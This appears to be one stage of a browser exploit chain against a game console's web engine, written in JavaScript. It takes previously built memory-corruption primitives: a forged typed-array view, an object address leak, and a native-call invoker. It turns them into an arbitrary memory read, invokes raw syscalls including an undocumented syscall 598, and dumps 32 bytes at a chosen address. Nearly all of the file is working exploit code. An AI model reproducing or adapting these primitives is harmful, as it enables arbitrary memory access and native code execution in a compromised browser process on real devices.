// Address-directed read at 0x12AB8000 — the stable 4-byte value syscall 598
// hands out (capture 9d6a6786: LE u32 0x12AB8000, stable across repeats and
// size args). Question: is that value a process address, and what lives
// there? This probe re-confirms the 598 value, then attempts ONE
// address-directed 32-byte read at 0x12AB8000 through the held History
// primitive. RISK, accepted by the operator: if 0x12AB8000 is unmapped in
// this process (e.g., it is a GPU/dmem or kernel-side value, the leading
// hypothesis given its range), the dereference faults the WebProcess —
// browser reload, console untouched. If mapped, the 32 bytes are captured.
// The read deliberately omits the usual >=4GB address gate: the target is
// legitimately in the low range. Safety checks on the held plan and
// canaries run first; mark before the read localizes any death.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase))
    throw new Error("held_plan_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function same(left, right) {
    if (!left || !right || left.length !== right.length) return false;
    for (var n = 0; n < left.length; n++)
      if (left[n] !== right[n]) return false;
    return true;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("read_preflight");
  phase = "confirm_598";
  if (typeof native.wrappers.sys598 !== "number")
    throw new Error("sys598_not_installed");
  var sizeAddress = plan.addresses.frame + 0x1e00;
  var frameView = new DataView(plan.frame.buffer);
  var sizeWordOriginal = frameView.getUint32(0x1e00, true);
  frameView.setUint32(0x1e00, 0x1000, true);
  frameView.setUint32(0x1e04, 0, true);
  plan.frame.fill(0, 0x200, 0x300);
  var call598 = native.call("sys598", [plan.addresses.frame + 0x200,
    sizeAddress]);
  frameView.setUint32(0x1e00, sizeWordOriginal, true);
  var confirmHex = "";
  for (var c = 0; c < 4; c++)
    confirmHex += ("0" + plan.frame[0x200 + c].toString(16)).slice(-2);
  var confirmValue = (plan.frame[0x200]) |
                     (plan.frame[0x201] << 8) |
                     (plan.frame[0x202] << 16) |
                     (plan.frame[0x203] << 24);
  if (confirmValue >>> 0 !== 0x12ab8000)
    throw new Error("value_changed_" + confirmHex);
  phase = "read_attempt";
  mark("read_attempt_before");
  var readBytes = readAt(0x12ab8000, 32);
  mark("read_attempt_after");
  phase = "pack";
  var readHex = "";
  for (var h = 0; h < 32; h++)
    readHex += ("0" + readBytes[h].toString(16)).slice(-2);
  var ascii = "";
  for (var a = 0; a < 32; a++) {
    var ch = readBytes[a];
    ascii += (ch >= 32 && ch < 127) ? String.fromCharCode(ch) : ".";
  }
  var after = native.call("getpid", []);
  mark("read_done");
  result = { id: "read_12ab8000_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { confirm_hex: confirmHex,
      target: "0x12ab8000",
      read_hex: readHex, read_ascii: ascii,
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "read_12ab8000_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
